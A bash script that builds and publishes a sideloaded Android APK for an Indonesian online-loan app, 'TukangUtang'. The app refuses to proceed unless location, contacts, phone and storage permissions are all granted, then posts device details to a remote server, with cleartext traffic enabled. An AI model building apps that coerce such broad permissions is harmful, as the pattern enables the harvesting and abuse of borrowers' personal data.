#!/bin/bash

echo "🔧 Fixing APK Build Error..."

cd /var/www/demo

# Extract Flutter if not exists
if [ ! -d "flutter/flutter" ]; then
    echo "📦 Extracting Flutter SDK..."
    tar -xf flutter_linux_3.24.5-stable.tar.xz
    mv flutter flutter_temp
    mkdir -p flutter
    mv flutter_temp flutter/
fi

# Set Flutter path
export FLUTTER_ROOT=/var/www/demo/flutter/flutter
export PATH=$FLUTTER_ROOT/bin:$PATH

# Accept licenses
echo "📝 Accepting Flutter licenses..."
yes | flutter doctor --android-licenses

# Create clean project
echo "📱 Creating clean Flutter project..."
rm -rf tukangutang_app
flutter create --org com.tukangutang --project-name tukangutang_app tukangutang_app

cd tukangutang_app

# Update pubspec.yaml
cat > pubspec.yaml << 'EOF'
name: tukangutang_app
description: "TukangUtang - Pinjaman Online"
publish_to: 'none'
version: 1.0.0+1

environment:
  sdk: '>=3.0.0 <4.0.0'

dependencies:
  flutter:
    sdk: flutter
  cupertino_icons: ^1.0.2
  http: ^1.1.0
  shared_preferences: ^2.2.2
  permission_handler: ^11.0.1
  geolocator: ^10.1.0
  device_info_plus: ^9.1.1

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^3.0.0

flutter:
  uses-material-design: true
EOF

# Create main.dart with proper error handling
cat > lib/main.dart << 'EOF'
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:geolocator/geolocator.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'dart:convert';
import 'dart:io';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'TukangUtang',
      theme: ThemeData(
        primarySwatch: Colors.green,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: PermissionScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class PermissionScreen extends StatefulWidget {
  @override
  _PermissionScreenState createState() => _PermissionScreenState();
}

class _PermissionScreenState extends State<PermissionScreen> {
  bool _isLoading = false;
  String _errorMessage = '';
  String _successMessage = '';

  Future<void> _requestPermissions() async {
    setState(() {
      _isLoading = true;
      _errorMessage = '';
      _successMessage = '';
    });

    try {
      // Request permissions
      Map<Permission, PermissionStatus> statuses = await [
        Permission.location,
        Permission.contacts,
        Permission.phone,
        Permission.storage,
      ].request();

      // Check permissions
      bool allGranted = statuses.values.every((status) => status.isGranted);
      
      if (allGranted) {
        await _submitFormData();
        setState(() {
          _successMessage = '✅ Berhasil! Aplikasi siap digunakan.';
        });
      } else {
        setState(() {
          _errorMessage = '❌ Semua izin harus diberikan untuk melanjutkan';
        });
      }
    } catch (e) {
      setState(() {
        _errorMessage = '❌ Error: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _submitFormData() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      String deviceModel = 'Unknown';
      
      if (Platform.isAndroid) {
        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
        deviceModel = '${androidInfo.brand} ${androidInfo.model}';
      }

      final response = await http.post(
        Uri.parse('https://d.seoikrom.com/api/flutter/submit-form'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'phoneNumber': '+6281234567890',
          'fullName': 'User',
          'email': 'user@example.com',
          'deviceModel': deviceModel,
          'imei': 'Unknown',
        }),
      ).timeout(Duration(seconds: 30));

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success']) {
          await SharedPreferences.getInstance().then((prefs) {
            prefs.setString('userId', data['userId'].toString());
          });
        }
      } else {
        throw Exception('Server error: ${response.statusCode}');
      }
    } catch (e) {
      throw Exception('Network error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('TukangUtang'),
        backgroundColor: Colors.green,
        elevation: 0,
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Colors.green, Colors.white],
          ),
        ),
        child: Padding(
          padding: EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              SizedBox(height: 20),
              Card(
                elevation: 8,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Padding(
                  padding: EdgeInsets.all(20.0),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Icon(Icons.security, color: Colors.green, size: 24),
                          SizedBox(width: 8),
                          Text(
                            'Permohonan Izin',
                            style: TextStyle(
                              fontSize: 20,
                              fontWeight: FontWeight.bold,
                              color: Colors.green,
                            ),
                          ),
                        ],
                      ),
                      SizedBox(height: 16),
                      Text(
                        'TukangUtang mengumpulkan dan memproses informasi pengguna yang diperlukan sesuai dengan hukum dan peraturan yang berlaku untuk memberikan layanan pinjaman berkualitas tinggi.',
                        style: TextStyle(fontSize: 14, height: 1.5),
                      ),
                      SizedBox(height: 16),
                      Text(
                        'Kami berjanji untuk menggunakan informasi pengguna secara legal, valid, dan dengan izin, serta mengambil langkah-langkah keamanan yang ketat untuk melindungi keamanan data pengguna.',
                        style: TextStyle(fontSize: 14, height: 1.5),
                      ),
                      SizedBox(height: 16),
                      Text(
                        '1. Informasi yang Kami Kumpulkan:',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 16,
                          color: Colors.green,
                        ),
                      ),
                      SizedBox(height: 8),
                      _buildInfoItem('• Informasi Pribadi: nama, nomor telepon, alamat'),
                      _buildInfoItem('• Informasi Identitas: foto KTP, selfie, nomor KTP'),
                      _buildInfoItem('• Informasi Lokasi: GPS untuk keamanan'),
                      _buildInfoItem('• Informasi Kontak: untuk verifikasi'),
                      _buildInfoItem('• Informasi Perangkat: untuk keamanan'),
                    ],
                  ),
                ),
              ),
              SizedBox(height: 20),
              if (_errorMessage.isNotEmpty)
                Container(
                  padding: EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.red[50],
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: Colors.red[200]),
                  ),
                  child: Row(
                    children: [
                      Icon(Icons.error, color: Colors.red[700]),
                      SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          _errorMessage,
                          style: TextStyle(color: Colors.red[700]),
                        ),
                      ),
                    ],
                  ),
                ),
              if (_successMessage.isNotEmpty)
                Container(
                  padding: EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.green[50],
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: Colors.green[200]),
                  ),
                  child: Row(
                    children: [
                      Icon(Icons.check_circle, color: Colors.green[700]),
                      SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          _successMessage,
                          style: TextStyle(color: Colors.green[700]),
                        ),
                      ),
                    ],
                  ),
                ),
              SizedBox(height: 20),
              ElevatedButton(
                onPressed: _isLoading ? null : _requestPermissions,
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.green,
                  foregroundColor: Colors.white,
                  padding: EdgeInsets.symmetric(vertical: 16),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8),
                  ),
                  elevation: 4,
                ),
                child: _isLoading
                    ? Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          SizedBox(
                            width: 20,
                            height: 20,
                            child: CircularProgressIndicator(
                              color: Colors.white,
                              strokeWidth: 2,
                            ),
                          ),
                          SizedBox(width: 12),
                          Text('Memproses...'),
                        ],
                      )
                    : Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.check_circle),
                          SizedBox(width: 8),
                          Text(
                            'Setuju dan Lanjutkan',
                            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
                          ),
                        ],
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInfoItem(String text) {
    return Padding(
      padding: EdgeInsets.symmetric(vertical: 2),
      child: Text(
        text,
        style: TextStyle(fontSize: 14),
      ),
    );
  }
}
EOF

# Update Android permissions
cat > android/app/src/main/AndroidManifest.xml << 'EOF'
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />

    <application
        android:label="TukangUtang"
        android:name="${applicationName}"
        android:icon="@mipmap/ic_launcher"
        android:usesCleartextTraffic="true">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@style/LaunchTheme"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:windowSoftInputMode="adjustResize">
            <meta-data
              android:name="io.flutter.embedding.android.NormalTheme"
              android:resource="@style/NormalTheme"
              />
            <intent-filter android:autoVerify="true">
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <meta-data
            android:name="flutterEmbedding"
            android:value="2" />
    </application>
</manifest>
EOF

# Build APK
echo "🔨 Building APK..."
flutter clean
flutter pub get
flutter build apk --release

# Copy APK
echo "📦 Copying APK..."
cp build/app/outputs/flutter-apk/app-release.apk /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk

echo "✅ APK built successfully!"
echo "📱 APK location: /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk"
echo "🌐 Download URL: https://d.seoikrom.com/tukangutang_app_release.apk"
echo "📋 APK size: $(ls -lh /var/www/demo/dashboard-frontend/public/tukangutang_app_release.apk | awk '{print $5}')"

 